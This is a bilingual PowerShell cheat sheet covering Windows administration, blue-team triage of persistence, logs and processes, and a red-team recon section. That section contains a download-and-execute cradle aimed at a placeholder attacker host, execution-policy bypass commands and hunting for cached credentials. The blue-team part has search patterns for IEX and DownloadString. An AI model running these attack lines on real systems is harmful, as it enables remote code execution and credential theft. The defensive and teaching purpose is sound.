---
title: "PowerShell Commands"
tags: [powershell, windows, cli, sysadmin, it-support, blue-team, red-team, tools]
---

# PowerShell Commands

Reference for IT support, Blue Team analysis, and Red Team reconnaissance on Windows systems. Commands grouped by context. See also: [[Linux Terminal Commands]].

> PowerShell cmdlets follow a `Verb-Noun` pattern. Aliases like `ls`, `ps`, `cat` work but avoid them in scripts for clarity. Run PowerShell as Administrator where indicated.

---

## Help & Discovery

```powershell
Get-Help <cmdlet>              # full help
Get-Help <cmdlet> -Examples    # usage examples only
Get-Help <cmdlet> -Online      # open docs in browser
Get-Command *<keyword>*        # find cmdlets by keyword
Get-Command -Verb Get          # all Get-* cmdlets
Get-Alias                      # list all aliases
Get-Member                     # show object properties/methods (pipe to it)
$PSVersionTable                # PowerShell version info
```

---

## ==Navigation & File System==

| Cmdlet | Alias | Description | Common Parameters |
|--------|-------|-------------|-------------------|
| `Get-Location` | `pwd` | Current directory | — |
| `Set-Location <path>` | `cd` | Change directory | — |
| `Get-ChildItem <path>` | `ls`, `dir` | List contents | `-Recurse`, `-Force` (hidden), `-Filter *.txt`, `-File`, `-Directory` |
| `Get-Item <path>` | `gi` | Get item properties | — |
| `New-Item <path>` | `ni` | Create file/directory | `-ItemType File/Directory` |
| `Copy-Item <src> <dst>` | `cp` | Copy | `-Recurse`, `-Force` |
| `Move-Item <src> <dst>` | `mv` | Move/rename | — |
| `Remove-Item <path>` | `rm`, `del` | Delete | `-Recurse`, `-Force` |
| `Rename-Item <path> <n>` | — | Rename | — |
| `Test-Path <path>` | — | Check if path exists | — |
| `Resolve-Path <path>` | — | Resolve relative path | — |

```powershell
# List all files including hidden, with details
Get-ChildItem -Path C:\Users -Force -Recurse -ErrorAction SilentlyContinue

# Find files modified in the last 24 hours
Get-ChildItem -Path C:\inetpub -Recurse -File |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) }

# Find files by extension
Get-ChildItem -Path C:\ -Recurse -Filter "*.ps1" -ErrorAction SilentlyContinue

# Get full path of a file
(Get-Item .\script.ps1).FullName
```

---

## ==File Content==

| Cmdlet | Alias | Description | Common Parameters |
|--------|-------|-------------|-------------------|
| `Get-Content <file>` | `cat`, `type` | Read file | `-Tail 50`, `-Wait` (live follow), `-Encoding UTF8` |
| `Set-Content <file>` | — | Write to file (overwrite) | — |
| `Add-Content <file>` | — | Append to file | — |
| `Out-File <file>` | — | Redirect output to file | `-Append`, `-Encoding UTF8` |
| `Select-String <pattern> <file>` | `sls` | grep equivalent | `-Pattern`, `-CaseSensitive`, `-NotMatch`, `-Recurse`, `-List` |

```powershell
# Live log monitoring (like tail -f)
Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log -Wait -Tail 20

# Grep equivalent – search for pattern
Select-String -Path C:\logs\*.log -Pattern "failed|error" -CaseSensitive:$false

# Search all PS1 files for a string (script hunting)
Select-String -Path C:\Users -Recurse -Filter "*.ps1" -Pattern "Invoke-Expression|IEX|DownloadString"

# Read and decode base64 from file
$encoded = Get-Content .\payload.txt
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
```

---

## ==System Information==

```powershell
# OS and hardware overview
Get-ComputerInfo
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer

# OS version
[System.Environment]::OSVersion
$PSVersionTable.OS

# Hostname
$env:COMPUTERNAME
hostname

# Uptime
(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime

# Environment variables
Get-ChildItem Env:
$env:PATH
$env:USERPROFILE

# Timezone
Get-TimeZone
```

---

## ==User & Group Management==

| Cmdlet | Description | Common Parameters |
|--------|-------------|-------------------|
| `Get-LocalUser` | List local users | — |
| `New-LocalUser` | Create local user | `-Name`, `-Password`, `-FullName` |
| `Set-LocalUser` | Modify local user | `-Password`, `-PasswordNeverExpires` |
| `Remove-LocalUser` | Delete local user | `-Name` |
| `Enable-LocalUser / Disable-LocalUser` | Enable/disable account | — |
| `Get-LocalGroup` | List local groups | — |
| `Get-LocalGroupMember <group>` | Members of group | — |
| `Add-LocalGroupMember` | Add user to group | `-Group`, `-Member` |
| `Get-ADUser` | AD user (requires RSAT) | `-Filter *`, `-Identity`, `-Properties *` |
| `Get-ADGroupMember` | AD group members | `-Identity`, `-Recursive` |
| `whoami` | Current user | `/all` – full token with groups and privileges |
| `net user` | Legacy user management | `net user <n>` details |

```powershell
# All local users and their status
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet

# Members of local Administrators group
Get-LocalGroupMember -Group "Administrators"

# Current user privileges (recon / UAC check)
whoami /all

# Check if current user is admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# AD: find all enabled users
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Select-Object Name, LastLogonDate | Sort-Object LastLogonDate -Descending

# AD: find users that haven't logged in for 90 days
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter {LastLogonDate -lt $cutoff -and Enabled -eq $true} -Properties LastLogonDate
```

> [!warning] Persistence-Check: Lokale Admins und UID 0-Äquivalent
> `Get-LocalGroupMember -Group "Administrators"` zeigt alle lokalen Admin-Accounts. Nach einer Kompromittierung: jeder unbekannte Eintrag ist verdächtig. Auch `whoami /all` prüfen — Angreifer fügen sich oft selbst zu privilegierten Gruppen hinzu.

---

## ==Process Management==

| Cmdlet | Alias | Description | Common Parameters |
|--------|-------|-------------|-------------------|
| `Get-Process` | `ps` | List processes | `-Name`, `-Id`, `-IncludeUserName` |
| `Start-Process` | — | Start process | `-FilePath`, `-ArgumentList`, `-Verb RunAs` |
| `Stop-Process` | `kill` | Kill process | `-Name`, `-Id`, `-Force` |
| `Get-CimInstance Win32_Process` | — | Process details incl. parent PID | — |
| `Wait-Process` | — | Wait for process to exit | — |

```powershell
# All processes with username (requires admin)
Get-Process -IncludeUserName | Select-Object Name, Id, CPU, UserName | Sort-Object CPU -Descending

# Find suspicious processes (common malware names)
Get-Process | Where-Object { $_.Name -match "powershell|cmd|wscript|cscript|mshta|rundll32|regsvr32" }

# Full process info including command line and parent PID
Get-CimInstance Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine |
    Where-Object { $_.CommandLine -ne $null }

# Kill process by name
Stop-Process -Name "notepad" -Force

# Check if a specific process is running
if (Get-Process -Name "malware" -ErrorAction SilentlyContinue) { Write-Host "Running" }
```

> [!tip] `Get-CimInstance Win32_Process` statt `Get-Process`
> `Get-Process` zeigt keine Parent-PIDs und keine vollständigen Command Lines. `Get-CimInstance Win32_Process` liefert beides — unverzichtbar für die Prozessbaum-Analyse wie in [[Windows Endpoint Monitoring]].

---

## ==Network==

| Cmdlet | Description | Common Parameters |
|--------|-------------|-------------------|
| `Get-NetIPAddress` | IP addresses | `-AddressFamily IPv4` |
| `Get-NetRoute` | Routing table | — |
| `Get-NetAdapter` | Network interfaces | — |
| `Get-NetTCPConnection` | Active TCP connections (ss/netstat equivalent) | `-State Listen/Established`, `-LocalPort` |
| `Test-Connection` | Ping | `-ComputerName`, `-Count 4`, `-Quiet` |
| `Test-NetConnection` | TCP port test + traceroute | `-ComputerName`, `-Port`, `-TraceRoute` |
| `Resolve-DnsName` | DNS lookup | `-Type A/MX/TXT/NS`, `-Server 8.8.8.8` |
| `Invoke-WebRequest` | HTTP client (curl equivalent) | `-Uri`, `-Method`, `-Headers`, `-OutFile` |
| `Invoke-RestMethod` | REST API client | `-Uri`, `-Method`, `-Body`, `-Headers` |
| `Get-NetFirewallRule` | Firewall rules | `-Direction Inbound/Outbound`, `-Enabled True` |

```powershell
# All listening ports with process (IT support / recon)
Get-NetTCPConnection -State Listen |
    Select-Object LocalAddress, LocalPort, OwningProcess |
    Sort-Object LocalPort

# Established connections with process names
Get-NetTCPConnection -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess,
        @{Name="Process"; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}} |
    Sort-Object RemoteAddress

# Test connectivity and port
Test-NetConnection -ComputerName 8.8.8.8 -Port 53

# DNS lookup
Resolve-DnsName google.com -Type A
Resolve-DnsName google.com -Type MX

# Download file (curl equivalent)
Invoke-WebRequest -Uri "http://target.com/file.zip" -OutFile "C:\Temp\file.zip"

# ARP cache
Get-NetNeighbor -AddressFamily IPv4
```

---

## ==Services==

| Cmdlet | Description | Common Parameters |
|--------|-------------|-------------------|
| `Get-Service` | List services | `-Name`, `-DisplayName`, `-Status` |
| `Start-Service / Stop-Service` | Start/stop service | `-Name`, `-Force` |
| `Restart-Service` | Restart service | — |
| `Set-Service` | Modify service | `-StartupType Automatic/Manual/Disabled` |
| `New-Service` | Create service | `-Name`, `-BinaryPathName` |
| `Get-CimInstance Win32_Service` | Detailed service info incl. path | — |

```powershell
# All running services
Get-Service | Where-Object { $_.Status -eq "Running" }

# Services with non-standard binary paths (persistence check)
Get-CimInstance Win32_Service |
    Where-Object { $_.PathName -notmatch "system32|SysWOW64|Program Files" } |
    Select-Object Name, State, PathName

# Stopped services that are set to auto-start (troubleshooting)
Get-Service | Where-Object { $_.Status -eq "Stopped" -and $_.StartType -eq "Automatic" }
```

---

## ==Registry==

| Cmdlet | Description | Example |
|--------|-------------|---------|
| `Get-Item HKLM:\...` | Read registry key | `Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"` |
| `Get-ItemProperty` | Read registry values | `Get-ItemProperty "HKLM:\...\Run"` |
| `Set-ItemProperty` | Write registry value | — |
| `New-Item` | Create registry key | `-Path "HKCU:\..."` |
| `Remove-Item` | Delete registry key | — |
| `Get-ChildItem` | List registry subkeys | — |

```powershell
# Common persistence locations (autorun)
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $runKeys) {
    Write-Host "`n=== $key ===" -ForegroundColor Cyan
    Get-ItemProperty $key -ErrorAction SilentlyContinue
}

# Check AppInit_DLLs (DLL injection persistence)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs
```

> [!warning] Registry Persistence Locations
> Die vier Run-Keys (`HKLM\...\Run`, `HKCU\...\Run`, je `RunOnce`) sind die klassischsten Persistence-Standorte — Malware trägt sich hier ein, um bei jedem Login zu starten. Auch `AppInit_DLLs` prüfen: eine DLL dort wird in jeden Prozess injiziert, der `user32.dll` lädt.

---

## ==Event Logs==

| Cmdlet | Description | Common Parameters |
|--------|-------------|-------------------|
| `Get-EventLog` | Legacy event log reader | `-LogName`, `-Newest`, `-EntryType`, `-Source` |
| `Get-WinEvent` | Modern event log reader (preferred) | `-LogName`, `-FilterHashtable`, `-MaxEvents`, `-ComputerName` |
| `Clear-EventLog` | Clear event log | `-LogName` |

```powershell
# Failed logon attempts (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 |
    Select-Object TimeCreated, Message

# Successful logons (Event ID 4624)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 50 |
    Select-Object TimeCreated, @{N="User"; E={$_.Properties[5].Value}}, @{N="LogonType"; E={$_.Properties[8].Value}}

# Service installation events (Event ID 7045 – common malware install vector)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
    Select-Object TimeCreated, Message

# Process creation events (requires Audit Process Creation enabled – Event ID 4688)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 |
    Select-Object TimeCreated, @{N="Process"; E={$_.Properties[5].Value}}, @{N="CommandLine"; E={$_.Properties[8].Value}}

# PowerShell script block logging (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.Id -eq 4104 } | Select-Object -First 20 TimeCreated, Message

# Export events to CSV
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 500 |
    Select-Object TimeCreated, Message |
    Export-Csv -Path C:\Temp\failed_logons.csv -NoTypeInformation
```

> [!tip] `Get-WinEvent` statt `Get-EventLog`
> `Get-EventLog` ist legacy und funktioniert nicht für alle Log-Kanäle (z.B. Sysmon, PowerShell/Operational). `Get-WinEvent` mit `-FilterHashtable` ist schneller, flexibler und der Standard für SOC-Arbeit.

### Key Event IDs

| Event ID | Log | Description |
|----------|-----|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Logon with explicit credentials |
| 4672 | Security | Special privileges assigned (admin logon) |
| 4688 | Security | Process creation (with command line if enabled) |
| 4698 | Security | Scheduled task created |
| 4699 | Security | Scheduled task deleted |
| 4720 | Security | User account created |
| 4732 | Security | Member added to local group |
| 7045 | System | New service installed |
| 1102 | Security | Audit log cleared |
| 4104 | PS/Operational | PowerShell script block execution |

---

## ==Scheduled Tasks==

```powershell
# List all scheduled tasks
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" }

# Tasks not created by Microsoft (persistence check)
Get-ScheduledTask |
    Where-Object { $_.Author -notmatch "Microsoft|NT AUTHORITY" } |
    Select-Object TaskName, TaskPath, Author, State

# Full details of a specific task
Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo

# Task actions (what does it run?)
Get-ScheduledTask |
    Select-Object TaskName, @{N="Action"; E={($_.Actions | ForEach-Object { $_.Execute + " " + $_.Arguments }) -join "; "}} |
    Where-Object { $_.Action -ne $null }
```

---

## ==Hashing & Encoding==

```powershell
# File hash (MD5, SHA1, SHA256)
Get-FileHash .\malware.exe -Algorithm SHA256
Get-FileHash .\malware.exe -Algorithm MD5

# Base64 encode a string
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("whoami"))

# Base64 decode
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hvYW1p"))

# Base64 encode a file
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))
```

---

## ==Remoting & WMI==

```powershell
# Enable PS remoting (requires admin)
Enable-PSRemoting -Force

# Remote session (interactive)
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Run command on remote host
Invoke-Command -ComputerName TARGET -ScriptBlock { Get-Process } -Credential (Get-Credential)

# WMI – process list with command line
Get-CimInstance -ClassName Win32_Process | Select-Object Name, ProcessId, CommandLine

# WMI – OS info
Get-CimInstance -ClassName Win32_OperatingSystem

# WMI – installed software
Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version, InstallDate | Sort-Object Name

# WMI – network adapters
Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
```

---

## ==Filtering & Pipeline==

Die PowerShell-Pipeline übergibt Objekte zwischen Cmdlets — nicht Text wie in Bash. Das ermöglicht direktes Filtern auf Eigenschaften ohne String-Parsing.

### ==Where-Object==

Filtert Objekte aus der Pipeline anhand einer Bedingung. Alias: `?` oder `where`.

```powershell
# Grundsyntax (Scriptblock)
Get-Service | Where-Object { $_.Status -eq "Running" }

# Kurzform (vereinfachte Syntax, nur eine Bedingung)
Get-Service | Where-Object Status -eq "Running"

# Vergleichsoperatoren
# -eq   gleich           -ne   ungleich
# -gt   größer           -lt   kleiner
# -ge   größer gleich    -le   kleiner gleich
# -match Regex           -notmatch Regex
# -like  Wildcard        -notlike  Wildcard
# -contains enthält      -in  Wert ist in Array

# Mehrere Bedingungen (AND)
Get-Process | Where-Object { $_.CPU -gt 10 -and $_.Name -ne "Idle" }

# Mehrere Bedingungen (OR)
Get-Service | Where-Object { $_.Status -eq "Stopped" -or $_.StartType -eq "Disabled" }

# Regex-Match auf String-Eigenschaft
Get-Process | Where-Object { $_.Name -match "^sv" }        # beginnt mit "sv"
Get-Process | Where-Object { $_.Name -notmatch "svchost" }

# Wildcard (-like)
Get-Service | Where-Object { $_.DisplayName -like "*Windows*" }

# Null-Check
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -ne $null }

# Eigenschaft existiert / ist gesetzt
Get-ChildItem | Where-Object { $_.PSIsContainer -eq $false }  # nur Dateien, keine Ordner
```

> [!tip] `$_` ist das aktuelle Objekt in der Pipeline
> In einem `Where-Object`-Scriptblock (und auch in `ForEach-Object`) steht `$_` für das Objekt, das gerade durch die Pipeline läuft. `$_.Name` greift auf die `Name`-Eigenschaft zu.

### ==Select-Object==

Wählt bestimmte Eigenschaften aus oder begrenzt die Anzahl der Ergebnisse. Alias: `select`.

```powershell
# Bestimmte Eigenschaften auswählen
Get-Process | Select-Object Name, Id, CPU

# Erste / letzte N Ergebnisse
Get-Process | Select-Object -First 10
Get-Process | Select-Object -Last 5

# Duplikate entfernen
Get-NetTCPConnection | Select-Object -Property RemoteAddress -Unique

# Berechnete Eigenschaft (calculated property)
Get-Process | Select-Object Name, Id,
    @{Name="Mem(MB)"; Expression={[math]::Round($_.WorkingSet / 1MB, 1)}},
    @{Name="CPU(s)";  Expression={[math]::Round($_.CPU, 2)}}

# Alle Eigenschaften anzeigen (statt Standardansicht)
Get-Service wuauserv | Select-Object *

# Eigenschaft expandieren (zeigt Inhalt statt Typname)
Get-ScheduledTask | Select-Object TaskName -ExpandProperty Actions
```

### ==Sort-Object==

Sortiert die Pipeline-Ausgabe. Alias: `sort`.

```powershell
# Aufsteigend (Standard)
Get-Process | Sort-Object CPU

# Absteigend
Get-Process | Sort-Object CPU -Descending

# Nach mehreren Eigenschaften
Get-ChildItem | Sort-Object Extension, Name

# Top 10 nach CPU
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU

# Alphabetisch nach Name, dann absteigend nach Größe
Get-ChildItem C:\ | Sort-Object @{E="Name"; Ascending=$true}, @{E="Length"; Descending=$true}
```

### ==Group-Object==

Gruppiert Ergebnisse nach einer Eigenschaft — nützlich zum Zählen und Zusammenfassen.

```powershell
# Prozesse nach Name gruppieren (wie uniq -c in Bash)
Get-Process | Group-Object Name | Sort-Object Count -Descending

# TCP-Verbindungen nach Status gruppieren
Get-NetTCPConnection | Group-Object State | Sort-Object Count -Descending | Select-Object Name, Count

# Event Log Einträge nach Source zählen
Get-EventLog -LogName System -Newest 500 | Group-Object Source | Sort-Object Count -Descending | Select-Object -First 10 Name, Count

# Dateien nach Extension gruppieren
Get-ChildItem C:\Windows\System32 -File | Group-Object Extension | Sort-Object Count -Descending | Select-Object -First 10 Name, Count
```

### ==Measure-Object==

Berechnet Summe, Durchschnitt, Min/Max oder zählt Objekte.

```powershell
# Anzahl laufender Dienste
Get-Service | Where-Object Status -eq "Running" | Measure-Object

# Summe und Durchschnitt (numerische Eigenschaft)
Get-Process | Measure-Object CPU -Sum -Average -Maximum -Minimum

# Gesamtgröße aller Dateien in einem Ordner (in MB)
Get-ChildItem C:\Windows\System32 -File |
    Measure-Object Length -Sum |
    Select-Object @{N="Total(MB)"; E={[math]::Round($_.Sum / 1MB, 1)}}

# Zeilen in einer Datei zählen (wie wc -l)
Get-Content C:\log.txt | Measure-Object -Line
```

### ==ForEach-Object==

Führt einen Scriptblock für jedes Objekt in der Pipeline aus. Alias: `%` oder `foreach`.

```powershell
# Grundsyntax
Get-Process | ForEach-Object { Write-Host $_.Name }

# Kurzform mit Alias
Get-Service | % { "$($_.Name): $($_.Status)" }

# Mehrere Schritte pro Objekt
Get-ChildItem *.log | ForEach-Object {
    $size = [math]::Round($_.Length / 1KB, 1)
    Write-Host "$($_.Name) — $size KB"
}

# Mit Bedingung kombinieren
Get-Process | ForEach-Object {
    if ($_.CPU -gt 50) {
        Write-Host "$($_.Name) verbraucht viel CPU: $([math]::Round($_.CPU,1))s" -ForegroundColor Red
    }
}

# Alle Prozesse einer Liste stoppen
@("notepad", "calc", "mspaint") | ForEach-Object {
    Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue
}
```

> [!tip] `ForEach-Object` vs. `foreach`-Schleife
> `ForEach-Object` arbeitet in der Pipeline — Objekte werden einzeln durchgeleitet, kein Array im Speicher. Die `foreach`-Schleife (`foreach ($x in $collection)`) lädt erst alle Objekte. Bei großen Datensätzen ist `ForEach-Object` speichereffizienter.

### ==Pipeline-Kombinationen (Praxisbeispiele)==

```powershell
# Top 5 Prozesse nach RAM, mit berechneter Spalte
Get-Process |
    Where-Object { $_.WorkingSet -gt 50MB } |
    Select-Object Name, Id, @{N="Mem(MB)"; E={[math]::Round($_.WorkingSet/1MB,1)}} |
    Sort-Object "Mem(MB)" -Descending |
    Select-Object -First 5

# Alle .ps1-Dateien unter C:\Users, die "DownloadString" enthalten
Get-ChildItem C:\Users -Recurse -Filter "*.ps1" -ErrorAction SilentlyContinue |
    Select-String -Pattern "DownloadString|IEX|Invoke-Expression" |
    Select-Object Path, LineNumber, Line

# Offene Ports mit zugehörigem Prozessnamen
Get-NetTCPConnection -State Listen |
    Where-Object { $_.LocalAddress -ne "::1" } |
    Select-Object LocalPort, OwningProcess,
        @{N="Process"; E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} |
    Sort-Object LocalPort

# Dienste, die nicht von Microsoft signiert sind (vereinfacht)
Get-CimInstance Win32_Service |
    Where-Object { $_.PathName -notmatch "system32|SysWOW64" -and $_.State -eq "Running" } |
    Select-Object Name, PathName |
    Sort-Object Name

# Event Log: fehlgeschlagene Logins pro Stunde zählen
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 1000 |
    Group-Object { $_.TimeCreated.ToString("yyyy-MM-dd HH") } |
    Sort-Object Name |
    Select-Object Name, Count
```

---

## ==Output & Formatting==

```powershell
# Pipe to table
Get-Process | Format-Table Name, Id, CPU -AutoSize

# Pipe to list (detailed view)
Get-Service wuauserv | Format-List *

# Select specific properties
Get-Process | Select-Object Name, Id, CPU, @{Name="Mem(MB)"; Expression={[math]::Round($_.WorkingSet/1MB,1)}}

# Filter (Where-Object)
Get-Service | Where-Object { $_.Status -eq "Running" -and $_.Name -match "^win" }

# Sort results
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Export to CSV
Get-Process | Export-Csv -Path C:\Temp\processes.csv -NoTypeInformation

# Export to JSON
Get-NetTCPConnection | ConvertTo-Json | Out-File connections.json

# Count results
(Get-Service | Where-Object { $_.Status -eq "Running" }).Count
```

---

## ==Execution Policy & AMSI==

```powershell
# Check current execution policy
Get-ExecutionPolicy -List

# Set execution policy (requires admin)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# Bypass for single script (common in red team / testing)
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Check if AMSI is active
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

---

## ==Quick Reference: IT Support Scenarios==

```powershell
# --- Check disk space ---
Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{N="Used(GB)";E={[math]::Round($_.Used/1GB,1)}}, @{N="Free(GB)";E={[math]::Round($_.Free/1GB,1)}}

# --- Service not responding ---
Get-Service -Name "nginx" | Select-Object *
Restart-Service -Name "nginx" -Force
Get-EventLog -LogName System -Source "nginx" -Newest 10

# --- High CPU/memory ---
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU
Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 10 Name, Id, @{N="Mem(MB)";E={[math]::Round($_.WorkingSet/1MB,1)}}

# --- User account issues ---
Get-LocalUser -Name "jsmith"
Unlock-ADAccount -Identity jsmith         # AD
Enable-LocalUser -Name jsmith             # local

# --- Check Windows Update status ---
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10
```

---

## ==Quick Reference: Blue Team / Forensics==

```powershell
# --- Initial triage ---
$env:COMPUTERNAME; whoami /all
Get-LocalGroupMember -Group "Administrators"
Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
Get-Process -IncludeUserName | Where-Object { $_.UserName -notmatch "SYSTEM|LOCAL SERVICE|NETWORK SERVICE" }
Get-ScheduledTask | Where-Object { $_.Author -notmatch "Microsoft" } | Select-Object TaskName, Author

# --- Persistence locations ---
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | Select-Object TaskName, Author
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -notmatch "system32" }

# --- PowerShell activity ---
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message

# --- Recent file activity ---
Get-ChildItem C:\Users -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } |
    Select-Object FullName, LastWriteTime | Sort-Object LastWriteTime -Descending
```

---

## ==Quick Reference: Red Team / Recon==

```powershell
# --- Local enumeration ---
whoami /all
Get-LocalGroupMember -Group "Administrators"
Get-LocalUser
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess

# --- Network recon ---
Get-NetIPAddress -AddressFamily IPv4
Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias
Get-NetNeighbor -AddressFamily IPv4          # ARP cache

# --- Credential locations ---
cmdkey /list                                  # cached credentials
Get-ChildItem C:\Users -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue | Select-Object FullName

# --- Download and execute (for lab / CTF use only) ---
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')

# --- Bypass execution policy (single command) ---
powershell -ep bypass -c "Get-Process"

# --- Check AppLocker policies ---
Get-AppLockerPolicy -Effective | Select-Xml -XPath "//FilePathRule" | Select-Object -Expand Node
```

---

## Related

- [[Linux Terminal Commands]] – Linux/Unix equivalent commands for IT support and security tasks
- [[Windows Endpoint Monitoring]] – Core Windows Processes, Event Logs, Sysmon
- [[Windows Event Logs]] – Get-WinEvent, FilterHashtable, XPath im Detail
- [[ffuf Cheat Sheet]] – Web fuzzing tool
- [[Snort]] – Network-level detection complementing host-based PowerShell analysis

---

## References

- [Microsoft PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/)
- [SS64 PowerShell Reference](https://ss64.com/ps/)
- [PayloadsAllTheThings – Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS – Living Off The Land Binaries](https://lolbas-project.github.io)
- [adsecurity.org – Active Directory security](https://adsecurity.org)
